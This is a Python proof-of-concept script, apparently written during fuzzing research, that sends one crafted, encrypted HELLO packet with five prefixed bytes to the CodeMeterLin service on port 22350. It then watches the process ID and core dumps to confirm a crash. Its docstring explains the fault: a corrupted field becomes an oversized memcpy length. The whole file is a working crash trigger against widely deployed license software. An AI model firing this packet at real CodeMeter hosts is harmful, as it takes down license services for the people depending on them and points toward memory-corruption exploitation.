#!/usr/bin/env python3
"""Single-packet reproducer for the prefixed-HELLO CodeMeterLin crash.

The crashing mutation is:

    5e 35 5e d6 f2 || canonical HELLO with a fresh client token

Those five inserted bytes shift the canonical HELLO fields so the parser sees
the word at parsed struct +0x0c as 0x28000010, which is later used as the
memcpy length at CodeMeterLin+0x8f431d.
"""

from __future__ import annotations

import argparse
import importlib.util
import os
from pathlib import Path
import socket
import subprocess
import sys
import time


def load_samc(ax_fuzz: Path):
    mod_path = ax_fuzz / "tier1" / "samc_fuzz.py"
    sys.path.insert(0, str(mod_path.parent))
    spec = importlib.util.spec_from_file_location("samc_fuzz", mod_path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"cannot import {mod_path}")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def codemeter_pid() -> int | None:
    try:
        out = subprocess.check_output(["pgrep", "-x", "CodeMeterLin"], text=True, timeout=1)
    except Exception:
        return None
    pids = [int(tok) for tok in out.split() if tok.isdigit()]
    return pids[0] if pids else None


def newest_core() -> tuple[str, int, int] | None:
    paths = []
    for root in (Path("/var/tmp/cm_cores"), Path("/var/lib/systemd/coredump")):
        if root.exists():
            paths.extend(root.glob("*CodeMeterLin*"))
    if not paths:
        return None
    path = max(paths, key=lambda p: p.stat().st_mtime_ns)
    st = path.stat()
    return str(path), st.st_mtime_ns, st.st_size


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--ax-fuzz", default="/home/avj/clones/ax_fuzz")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=22350)
    ap.add_argument("--prefix", default="5e355ed6f2")
    ap.add_argument("--wait", type=float, default=10.0)
    args = ap.parse_args()

    samc = load_samc(Path(args.ax_fuzz))
    before_pid = codemeter_pid()
    before_core = newest_core()
    token = os.urandom(samc.HELLO_TOKEN_LEN)
    plaintext = samc.substitute_token(0, samc.CAPTURED_SESSION_C2D[0], token)
    plaintext = bytes.fromhex(args.prefix) + plaintext

    print(f"before_pid={before_pid}")
    print(f"before_core={before_core}")
    print(f"token={token.hex()}")
    print(f"plaintext_len={len(plaintext)}")
    print(f"plaintext_head={plaintext[:16].hex()}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2.0)
    sock.connect((args.host, args.port))
    try:
        sock.sendall(samc.encrypt_c2d_frame(plaintext, int(time.time())))
        try:
            resp = samc.recv_one_wire_frame(sock, timeout=2.0)
            inner = samc.decrypt_d2c_frame(resp, int(time.time())) if resp else None
            print(f"response_wire_len={None if resp is None else len(resp)}")
            print(f"response_inner_len={None if inner is None else len(inner)}")
        except Exception as exc:
            print(f"recv_exception={type(exc).__name__}:{exc}")
    finally:
        sock.close()

    deadline = time.time() + args.wait
    while time.time() < deadline:
        after_pid = codemeter_pid()
        after_core = newest_core()
        if after_pid != before_pid or after_core != before_core:
            break
        time.sleep(0.25)

    after_pid = codemeter_pid()
    after_core = newest_core()
    crashed = after_pid != before_pid or after_core != before_core
    print(f"after_pid={after_pid}")
    print(f"after_core={after_core}")
    print(f"crashed={crashed}")
    return 0 if crashed else 1


if __name__ == "__main__":
    raise SystemExit(main())
